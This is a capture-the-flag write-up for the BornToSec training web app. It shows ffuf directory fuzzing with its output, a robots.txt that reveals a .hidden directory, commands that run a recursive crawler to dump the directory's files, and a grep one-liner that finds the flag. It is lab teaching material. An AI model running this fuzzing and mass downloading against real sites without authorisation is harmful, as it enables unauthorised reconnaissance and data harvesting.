# File and Directory Exposure via accessible ```.hidden/``` directory

## 📖 Vulnerability Explanation
File and directory exposure is a misconfiguration vulnerability that allows an unauthorized user access to sensitive resources.

## ⚙️ Exploitation Process

- Enumerate the web directories via web fuzzing:

```
ffuf -u 'http://BornToSec.com/FUZZ' -w /sgoinfre/students/apena-ba/cybersecurity/SecLists/Discovery/Web-Content/big.txt -fs 975

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://BornToSec.com/FUZZ
 :: Wordlist         : FUZZ: /sgoinfre/students/apena-ba/cybersecurity/SecLists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 975
________________________________________________

admin                   [Status: 301, Size: 193, Words: 7, Lines: 8, Duration: 4ms]
audio                   [Status: 301, Size: 193, Words: 7, Lines: 8, Duration: 2ms]
css                     [Status: 301, Size: 193, Words: 7, Lines: 8, Duration: 0ms]
errors                  [Status: 301, Size: 193, Words: 7, Lines: 8, Duration: 0ms]
favicon.ico             [Status: 200, Size: 1406, Words: 2, Lines: 2, Duration: 0ms]
fonts                   [Status: 301, Size: 193, Words: 7, Lines: 8, Duration: 5ms]
images                  [Status: 301, Size: 193, Words: 7, Lines: 8, Duration: 0ms]
includes                [Status: 301, Size: 193, Words: 7, Lines: 8, Duration: 1ms]
js                      [Status: 301, Size: 193, Words: 7, Lines: 8, Duration: 0ms]
robots.txt              [Status: 200, Size: 53, Words: 4, Lines: 4, Duration: 0ms]
whatever                [Status: 301, Size: 193, Words: 7, Lines: 8, Duration: 12ms]
:: Progress: [20478/20478] :: Job [1/1] :: 12500 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

---

- Reading the ```robots.txt``` file reveals a directory called ```.hidden/```:

```
User-agent: *
Disallow: /whatever
Disallow: /.hidden
```

---

The folder contains one ```README``` file and a tree of directories and subdirectories containing more ```README``` files. We coded a python script to crawl all the files in the directory ```.hidden/``` and its subdirectories.

---

We coded a script to download all the files recursively present in a web server configured for directory listing.

In order to run it, we must create a python virtual environment and install the required packages using the ```requirements.txt``` file.

```
python3 -m venv my-python-env
```
```
./my-python-env/bin/pip3 install -r requirements.txt
```
```
./my-python-env/bin/python3 crawl.py 'http://BornToSec.com/.hidden/' ./dump
```

---

- Look for the flag using the command find:

```
find ./dump -type f -exec grep flag {} \; -exec echo -e '\n[+] Flag found in file:' {} '\n' \;
```

## 🔧 Fix
To prevent unwanted exposure of resources, we must implement a solid server configuration. Additionally, performing testing and security assessments regularly is recommended to ensure there are no misconfurations.

## ☝️🤓 Advanced explanation
The script we coded is a web crawler that downloads all files from a given base URL where directory listing is enabled. It recursively goes over routes and saves them, to then download all the files, showing the progress status. 

Usage:

```
python3 crawl.py <url> <directory>
```

- **url** → Base URL to crawl

- **directory** → Local folder to save files (created if missing)

Example:

```
python3 crawl.py "http://BornToSec.com/.hidden/" ./dump
```